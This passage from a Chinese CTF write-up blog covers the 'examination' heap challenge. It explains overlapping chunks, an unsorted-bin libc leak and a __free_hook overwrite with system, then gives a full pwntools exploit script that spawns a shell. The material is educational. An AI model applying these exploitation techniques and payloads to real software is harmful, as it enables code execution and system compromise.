+<p>修改后：</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251704.png" alt="image-20220418182640876"></p>
+<p>student 0的评价 chunk的size 修改为了0x491，现在释放student 0，则会覆盖student 1的所有chunk，从而进入unsorted bin</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251705.png" alt="image-20220418182733123"></p>
+<p>接下来 再次创建student 0，因为采用的是calloc创建chunk，所以会从unsorted bin中分割（0x30+0x20）</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251706.png" alt="image-20220418200807425"></p>
+<p>接下来给student 2写评价，分配0x388 会从unsorted bin中切割，切割前unsorted bin（0x5641b5595330）的fd 和bk指向libc，而切割后unsorted bin的fd 和bk 也会指向libc，我们控制切割后的unsorted bin正好是student1 的评价 chunk，那么我们利用student1 的check_review，即可泄露出libc，因此这里会覆盖到student1 ，所以要恢复student 1的一些指针信息</p>
+<p>之前student1的信息如下</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251707.png" alt="image-20220418203646146"></p>
+<p>现在student 2的评价chunk_addr=<code>0x5627124f8340</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251708.png" alt="image-20220418203528634"></p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x5627124f8340</span>距离student1 管理chunk的size距离为 <span class="number">0x5627124f8678</span><span class="number">-0x5627124f8340</span>=<span class="number">0x338</span></span><br><span class="line">所以我们需先填充<span class="number">0x338</span>个垃圾数据，接着依次填充<span class="number">0x31</span>，成绩单chunk的指针，该指针距离heap_base:<span class="number">0x00005627124f86b0</span><span class="number">-0x5627124f82a0</span>=<span class="number">0x410</span>,则需填充heap_base+<span class="number">0x410</span>,继续填充<span class="number">4</span>个p64(<span class="number">0</span>),<span class="number">0x21</span>,<span class="number">0x1</span>,评价 chunk的指针。该指针距离heap_base:</span><br><span class="line"><span class="number">0x00005627124f86d0</span><span class="number">-0x5627124f82a0</span>=<span class="number">0x430</span>,则需填充heap_base+<span class="number">0x430</span>,然后再填充<span class="number">0xa0</span>即可。</span><br><span class="line">payload如下</span><br><span class="line">payload=b<span class="number">&#x27;</span>\<span class="number">0&#x27;</span>*<span class="number">0x338</span>+p64(<span class="number">0x31</span>)+p64(heap_base+<span class="number">0x410</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">1</span>)+p64(heap_base+<span class="number">0x430</span>)+p64(<span class="number">0xa0</span>)</span><br></pre></td></tr></table></figure>
+
+<p>执行<code>write_review(2,0x388,payload)</code>后</p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251709.png" alt="image-20220418204930354"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251710.png" alt="image-20220418204938433"></p>
+<p>现在我们可以通过调用student 1的check_review函数泄露libc</p>
+<p>&lt;main_arean+96&gt;-0x60-0x10为__malloc_hook的地址</p>
+<p>则<code>libc_base=&lt;main_arean+96&gt;-0x60-0x10-libc.sym[&#39;__malloc_hook&#39;]</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251711.png" alt="image-20220418205502911"></p>
+<p>接下来修改student2的评价chunk，在student 2 的评价chunk中写入/bin/sh ，并在student 1的成绩单chunk的评价chunk指针处写入<code>__free_hook</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251712.png" alt="image-20220418221100985"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251713.png" alt="image-20220418221111020"></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251714.png" alt="image-20220418222249282"></p>
+<p>接下来修改student 1的评论chunk，因为刚才已经修改student 1的评论chunk指针修改为<code>__free_hook</code>,则我们修改student 1的评论chunk，就会向<code>__free_hook</code>中写入内容，这里我们写入system函数，那么我们free student2的评价chunk时就相当于调用了<code>system(&quot;/bin/sh&quot;)</code></p>
+<p><img src="https://cdn.jsdelivr.net/gh/wysyrg/picodemo/img/202204182251715.png" alt="image-20220418222235961"></p>
+<h3 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span>*</span><br><span class="line">context.log_level=<span class="string">&#x27;debug&#x27;</span></span><br><span class="line"><span class="comment">#p=remote(&#x27;124.70.130.92&#x27;,60001)</span></span><br><span class="line">p=process(<span class="string">&#x27;./examination&#x27;</span>)</span><br><span class="line">elf=ELF(<span class="string">&#x27;./examination&#x27;</span>)</span><br><span class="line">libc=ELF(<span class="string">&#x27;./libc-2.31.so&#x27;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">teacher_login</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;role: &lt;0.teacher/1.student&gt;:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">0</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">student_login</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;role: &lt;0.teacher/1.student&gt;:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add_student</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;choice&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;enter the number of questions:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">1</span>))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">give_score</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;choice&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">2</span>))</span><br><span class="line">    </span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_review_new</span>(<span class="params">index,size,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;choice&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;which one? &gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;please input the size of comment:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(size))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;enter your comment:&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">write_review_old</span>(<span class="params">index,content</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">&#x27;choice&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;which one? &gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;enter your comment:&#x27;</span>)</span><br><span class="line">    p.sendline(content)</span><br><span class="line">       </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">call_parent</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;choice&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">4</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;which student id to choose?&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_role</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;choice&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">5</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">check_review</span>(<span class="params">offset</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;choice&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;Good Job! Here is your reward! &#x27;</span>)</span><br><span class="line">    base=<span class="built_in">int</span>(p.recvline(),<span class="number">16</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;heap_base:&quot;</span>,<span class="built_in">hex</span>(base))</span><br><span class="line">    p.recvuntil(<span class="string">&#x27;add 1 to wherever you want! addr: &#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(base+offset).encode().ljust(<span class="number">15</span>,<span class="string">b&#x27; &#x27;</span>))</span><br><span class="line">    <span class="keyword">return</span> base</span><br><span class="line">    </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">show_review</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;choice&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="string">b&#x27;2&#x27;</span>)    </span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;here is the review:&#x27;</span>)</span><br><span class="line">  </span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">pray</span>():</span></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;choice&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">3</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">change_id</span>(<span class="params">index</span>):</span></span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;choice&gt;&gt;&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(<span class="number">6</span>))</span><br><span class="line">    p.recvuntil(<span class="string">b&#x27;input your id:&#x27;</span>)</span><br><span class="line">    p.sendline(<span class="built_in">str</span>(index))</span><br><span class="line"></span><br><span class="line">teacher_login()</span><br><span class="line"></span><br><span class="line">add_student() <span class="comment">#0</span></span><br><span class="line">write_review_new(<span class="number">0</span>,<span class="number">0x380</span>,<span class="string">b&#x27;A&#x27;</span>*<span class="number">8</span>)</span><br><span class="line">add_student() <span class="comment">#1</span></span><br><span class="line">write_review_new(<span class="number">1</span>,<span class="number">0xa0</span>,<span class="string">b&#x27;B&#x27;</span>*<span class="number">8</span>) </span><br><span class="line">add_student() <span class="comment">#2</span></span><br><span class="line"></span><br><span class="line">change_role()</span><br><span class="line">student_login()</span><br><span class="line">change_id(<span class="number">0</span>)  <span class="comment">#change student 0</span></span><br><span class="line">pray()        <span class="comment">#go to play</span></span><br><span class="line"></span><br><span class="line">change_role()</span><br><span class="line">teacher_login()</span><br><span class="line">give_score()  <span class="comment">#modify the score</span></span><br><span class="line"></span><br><span class="line">change_role()</span><br><span class="line">student_login()</span><br><span class="line">change_id(<span class="number">0</span>)  <span class="comment">#change student 0</span></span><br><span class="line"></span><br><span class="line">heap_base=check_review(<span class="number">0x49</span>)</span><br><span class="line"></span><br><span class="line">change_role()</span><br><span class="line">teacher_login()</span><br><span class="line">call_parent(<span class="number">0</span>) <span class="comment">#unsorted bin 0x490 and overlapping student 1</span></span><br><span class="line"></span><br><span class="line">add_student() <span class="comment">#division unsorted bin 0x30+0x20</span></span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;\0&#x27;</span>*<span class="number">0x338</span>+p64(<span class="number">0x31</span>)+p64(heap_base+<span class="number">0x410</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">1</span>)+p64(heap_base+<span class="number">0x430</span>)+p64(<span class="number">0xa0</span>)  </span><br><span class="line">write_review_new(<span class="number">2</span>,<span class="number">0x388</span>,payload)</span><br><span class="line"></span><br><span class="line">change_role()</span><br><span class="line">student_login()</span><br><span class="line">change_id(<span class="number">1</span>)  <span class="comment">#change student 1</span></span><br><span class="line"></span><br><span class="line">show_review()  <span class="comment">#leak libc</span></span><br><span class="line">libc_base = u64(p.recvuntil(<span class="string">b&#x27;\x7f&#x27;</span>)[-<span class="number">6</span>:].ljust(<span class="number">8</span>,<span class="string">b&#x27;\x00&#x27;</span>))-<span class="number">0x60</span> - <span class="number">0x10</span> - libc.sym[<span class="string">&#x27;__malloc_hook&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;libc_base: &#x27;</span>,<span class="built_in">hex</span>(libc_base))</span><br><span class="line"></span><br><span class="line">change_role()</span><br><span class="line">teacher_login()</span><br><span class="line"></span><br><span class="line">payload=<span class="string">b&#x27;/bin/sh\x00&#x27;</span>.ljust(<span class="number">0x338</span>,<span class="string">b&#x27;\x00&#x27;</span>)+p64(<span class="number">0x31</span>)+p64(heap_base+<span class="number">0x410</span>)+p64(<span class="number">0</span>)*<span class="number">4</span>+p64(<span class="number">0x21</span>)+p64(<span class="number">1</span>)+p64(libc_base+libc.sym[<span class="string">&#x27;__free_hook&#x27;</span>])+p64(<span class="number">0xa0</span>)</span><br><span class="line">write_review_old(<span class="number">2</span>,payload)</span><br><span class="line"></span><br><span class="line">write_review_old(<span class="number">1</span>,p64(libc_base+libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line"></span><br><span class="line">call_parent(<span class="number">2</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
+
+    </article>
+    <!-- license -->
+    
+    <!-- paginator -->
+    <ul class="post-paginator">
+        <li class="next">
+            
+        </li>
+        <li class="previous">
+            
+                <div class="prevSlogan">Previous Post</div>
+                <a href="/2022/04/17/LCTF2018%20PWN%20easy_heap/" title="LCTF2018 easy_heap">
+                    <div class="prevTitle">LCTF2018 easy_heap</div>
+                </a>
+            
+        </li>
+    </ul>
+    <!-- comment -->
+    
+        <div class="post-comment">
+            <!-- 来必力 City 版安装代码 -->
+
+
+            
+
+            
+
+            
+
+            <!-- utteranc评论 -->
+
+
+            <!-- partial('_partial/comment/changyan') -->
+            <!--PC版-->
+
+
+            
+            
+
+        </div>
+    
+    <!-- timeliness note -->
+    <!-- idea from: https://hexo.fluid-dev.com/posts/hexo-injector/#%E6%96%87%E7%AB%A0%E6%97%B6%E6%95%88%E6%80%A7%E6%8F%90%E7%A4%BA -->
+    
+    <!-- Mathjax -->
+    
+</main>
+
+                <!-- profile -->
+                
+            </div>
+            <footer class="footer footer-unloaded">
+    <!-- social  -->
+    
+        <div class="social">
+            
+    
+        
+            
+                <a href="mailto:2811745785@qq.com" class="iconfont-archer email" title=email ></a>
+            
+        
+    
+        
+            
+                <a href="//github.com/wysyrg" class="iconfont-archer github" target="_blank" title=github></a>
+            
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+        
+    
+
+
+        </div>
+    
+    <!-- powered by Hexo  -->
+    <div class="copyright">
+        <span id="hexo-power">Powered by <a href="https://hexo.io/" target="_blank">Hexo</a></span><span class="iconfont-archer power">&#xe635;</span><span id="theme-info">theme <a href="https://github.com/fi3ework/hexo-theme-archer" target="_blank">Archer</a></span>
+    </div>
+    <!-- website approve for Chinese user -->
+    
+    <!-- 不蒜子  -->
+    
+        <div class="busuanzi-container">
+            
+             
+                <span id="busuanzi_container_site_pv">PV: <span id="busuanzi_value_site_pv"></span> :)</span>
+            
+        </div>
+    	
+</footer>
+
+        </div>
+        <!-- toc -->
+        
+            <div class="toc-wrapper toc-wrapper-loding" style=
+
+
+
+
+
+
+
+    top:50vh;
+
+>
+                <div class="toc-catalog">
+                    <span class="iconfont-archer catalog-icon">&#xe613;</span><span>CATALOG</span>
+                </div>
+                <ol class="toc"><li class="toc-item toc-level-3"><a class="toc-link" href="#%E4%BF%9D%E6%8A%A4%E6%A3%80%E6%9F%A5"><span class="toc-number">1.</span> <span class="toc-text">保护检查</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#IDA%E5%88%86%E6%9E%90"><span class="toc-number">2.</span> <span class="toc-text">IDA分析</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#teacher"><span class="toc-number">2.1.</span> <span class="toc-text">teacher:</span></a></li><li class="toc-item toc-level-4"><a class="toc-link" href="#student%EF%BC%9A"><span class="toc-number">2.2.</span> <span class="toc-text">student：</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8"><span class="toc-number">3.</span> <span class="toc-text">漏洞利用</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#exp"><span class="toc-number">4.</span> <span class="toc-text">exp</span></a></li></ol>
+            </div>
+        
+        <!-- sidebar -->
+        <div class="sidebar sidebar-hide">
+    <ul class="sidebar-tabs sidebar-tabs-active-0">
+        <li class="sidebar-tab-archives"><span class="iconfont-archer">&#xe67d;</span><span class="tab-name">Archive</span></li>
+        <li class="sidebar-tab-tags"><span class="iconfont-archer">&#xe61b;</span><span class="tab-name">Tag</span></li>
+        <li class="sidebar-tab-categories"><span class="iconfont-archer">&#xe666;</span><span class="tab-name">Cate</span></li>
+    </ul>
+    <div class="sidebar-content sidebar-content-show-archive">
+        <div class="sidebar-panel-archives">
+    <!-- 在 ejs 中将 archive 按照时间排序 -->
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+        
+    
+    
+    
+    
+    <div class="total-and-search">
+        <div class="total-archive">
+        Total : 25
+        </div>
+        <!-- search  -->
+        
+    </div>
+    
+    <div class="post-archive">
+    
+        
+            
+            
+            <div class="archive-year"> 2022 </div>
+            <ul class="year-list">
+            
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/18</span>
+            <a class="archive-post-title" href="/2022/04/18/examination/">examination</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/17</span>
+            <a class="archive-post-title" href="/2022/04/17/LCTF2018%20PWN%20easy_heap/">LCTF2018 easy_heap</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/08</span>
+            <a class="archive-post-title" href="/2022/04/08/tcache/">tcache</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/07</span>
+            <a class="archive-post-title" href="/2022/04/07/libc-2.26/">libc 2.26</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/07</span>
+            <a class="archive-post-title" href="/2022/04/07/house-of-storm/">house of storm</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">04/04</span>
+            <a class="archive-post-title" href="/2022/04/04/%E5%B3%BB%E6%9E%81pwn/">峻极pwn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">03/19</span>
+            <a class="archive-post-title" href="/2022/03/19/stack%20pivoting/">stack pivoting</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">02/26</span>
+            <a class="archive-post-title" href="/2022/02/26/%E6%93%8D%E4%BD%9C%E7%B3%BB%E7%BB%9F/">操作系统</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/16</span>
+            <a class="archive-post-title" href="/2022/01/16/large%20bin%20attack/">large bin attack</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/15</span>
+            <a class="archive-post-title" href="/2022/01/15/magicheap/">magicheap</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/15</span>
+            <a class="archive-post-title" href="/2022/01/15/unsorted%20bin%20attack/">unsorted bin attack</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/13</span>
+            <a class="archive-post-title" href="/2022/01/13/pwn200/">pwn200</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/12</span>
+            <a class="archive-post-title" href="/2022/01/12/write%20some%20paper/">write some paper</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/09</span>
+            <a class="archive-post-title" href="/2022/01/09/fastbin_attack/">fastbin_attack</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/overlapping%20chunks/">overlapping chunks</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/gdb%E8%B0%83%E8%AF%95/">gdb的使用</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/ciscn_2019/">ciscn</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/csaw/">csaw部分题解</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/secretHolder_hitcon_2016/">secretHolder_hitcon_2016</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/unsafe_unlink/">unsafe_unlink</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/kernel_pwn%E7%8E%AF%E5%A2%83/">kernel pwn环境搭建</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/off-by-one/">off-by-one</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/pwnable%E5%88%B7%E9%A2%98/">pwnable刷题</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/lab1%20%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">lab1实验报告</a>
+        </li>
+    
+        
+        <li class="archive-post-item">
+            <span class="archive-post-date">01/08</span>
+            <a class="archive-post-title" href="/2022/01/08/lab2%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A/">lab2 实验报告</a>
+        </li>
+    
+    </div>
+</div>
+
+        <div class="sidebar-panel-tags">
+    <div class="sidebar-tags-name">
+        
+            <span class="sidebar-tag-name" data-tags="unsorted bin attack">
+                <span class="iconfont-archer">&#xe606;</span>
+                unsorted bin attack
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="house of spirit">
+                <span class="iconfont-archer">&#xe606;</span>
+                house of spirit
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="pwn">
+                <span class="iconfont-archer">&#xe606;</span>
+                pwn
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="fastbin doule free">
+                <span class="iconfont-archer">&#xe606;</span>
+                fastbin doule free
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="tcache">
+                <span class="iconfont-archer">&#xe606;</span>
+                tcache
+            </span>
+        
+            <span class="sidebar-tag-name" data-tags="os">
+                <span class="iconfont-archer">&#xe606;</span>
+                os
+            </span>
+        
+    </div>
+    <div class="iconfont-archer sidebar-tags-empty">&#xe678;</div>
+    <div class="tag-load-fail" style="display: none; color: #ccc; font-size: 0.6rem;">
+        缺失模块，请参考主题文档进行安装配置：https://github.com/fi3ework/hexo-theme-archer#%E5%AE%89%E8%A3%85%E4%B8%BB%E9%A2%98
+    </div> 
+    <div class="sidebar-tags-list"></div>
+</div>
+
+        <div class="sidebar-panel-categories">
+    <div class="sidebar-categories-name">
+    
+        <span class="sidebar-category-name" data-categories="Diary">
+            <span class="iconfont-archer">&#xe60a;</span>
+            Diary
+        </span>
+    
+    </div>
+    <div class="iconfont-archer sidebar-categories-empty">&#xe678;</div>
+    <div class="sidebar-categories-list"></div>
+</div>
+
+    </div>
+</div>
+
+        <!-- site-meta -->
+        <script>
+    var siteMeta = {
+        root: "/",
+        author: "John Doe"
+    }
+</script>
+
+        <!-- import experimental options here -->
+        <!-- Custom Font -->
+
+
+        <!-- main func -->
+        <script src="/scripts/main.js?v=20210823"></script>
+        <!-- dark mode -->
+        <script src="/scripts/dark.js?v=20210823"></script>
+        <!-- fancybox -->
+        <script src="https://cdn.jsdelivr.net/npm/@fancyapps/fancybox@3.5.7/dist/jquery.fancybox.min.js" defer></script>
+        <!-- algolia -->
+        
